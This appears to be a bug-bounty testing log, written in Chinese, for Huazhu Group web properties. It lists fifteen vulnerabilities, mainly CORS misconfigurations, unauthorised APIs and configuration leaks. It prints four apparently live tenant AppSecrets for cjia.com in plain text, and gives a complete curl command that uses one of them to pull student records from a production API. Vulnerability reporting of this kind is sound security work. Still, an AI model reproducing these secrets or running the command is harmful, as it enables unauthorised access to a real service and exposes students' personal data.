# 华住集团SRC测试记录 (2026-05-17)

## 测试范围
- *.huazhu.com / *.hworld.com / *.cjia.com

## 确认漏洞 (15个)
- 高危5: signin SSO CORS, franchise-cmsapi未授权+IDOR, cjia AppSecret数据泄露, customer CORS, portalapi CORS
- 中危7: idp CAS栈泄露, htravelserver CORS, hxr后台暴露, hweb-manager配置泄露, test-htravel测试环境, portalapi WiFi API未授权, haoportal配置泄露
- 低危3: cjia /userIp, qiyehao CORS, duhu CORS

## cjia.com AppSecret
tenant-H5:X8MpZJTnwuUKPF2A | tenant-wechat-miniprogram:49fSTptRZQuNvLns | tenant-alipay-miniprogram:mOLoNpteZNctVnT7 | tenant-wechat-h5:6vgijoGpONBIUfbs

## 2026-05-19 二次验证结果 (报告被驳回后)
- **cjia.com AppSecret**: 前端JS已修复(改为`R.ZP.APP_SERVICE_SECRET`变量引用)，但**泄露的密钥未轮换**，仍可调用API获取数据
- 验证命令: `curl -s -X POST "https://m.cjia.com/svr/user/auth/4c/searchAuthStudentList4c/0" -H "X-Cjia-Authorization: Basic dGVuYW50LUg1Olg4TXBaSlRud3VVS1BGMkE=" -H "Content-Type: application/json" -d '{"page":1,"pageSize":5}'`
- 返回数据: 10条学生记录(邵阳工业职业技术学院/湖北大学/浙江大学/复旦大学等)
- **教训**: JS修复≠密钥轮换，必须验证已泄露密钥是否仍可用
